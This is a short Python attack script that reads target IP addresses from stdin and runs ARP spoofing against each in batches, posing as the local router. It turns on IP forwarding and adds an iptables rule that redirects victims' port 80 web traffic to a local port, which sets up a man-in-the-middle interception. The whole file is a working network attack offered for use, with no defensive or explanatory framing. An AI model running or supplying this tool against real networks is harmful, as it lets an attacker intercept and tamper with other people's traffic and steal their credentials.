#!/usr/bin/env python3
"""
Read ip addresses from stdin and attack them

Usage:
    attach [options]

Options:
    --sleep SECONDS     [default: 120]
    --processes NUMBER  [default: 10]
    --router IP         [default: 10.10.8.1]
    --port PORT         [default: 8888]
"""
import logging
import os
import time
from subprocess import Popen, DEVNULL
from docopt import docopt
from sys import stdin


args = docopt(__doc__)
sleep = int(args["--sleep"])
router = args["--router"]
nproc = int(args["--processes"])
port = int(args["--port"])
iplist = stdin.read().strip().splitlines()

logging.basicConfig(level=logging.DEBUG,
                    format='[%(asctime)s %(module)s %(levelname)s] %(message)s',
                    datefmt='%d/%m %H:%M')

os.system("""echo "1" > /proc/sys/net/ipv4/ip_forward""")
logging.debug("setting up iptables")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %d" % port)

sigint = False
while True:
    try:
        for i in range(0, len(iplist), nproc):
            for j in range(i, min(len(iplist), i+nproc)):
                ip = iplist[j]
                logging.info("attack %s" % ip)
                p = Popen(["arpspoof", "-t", ip, router])
            time.sleep(sleep)
    except KeyboardInterrupt:
        sigint = True

    os.system("pkill -SIGINT arpspoof")
    if sigint:
        break

logging.debug("cleaning up iptables")
os.system("iptables -t nat -F")
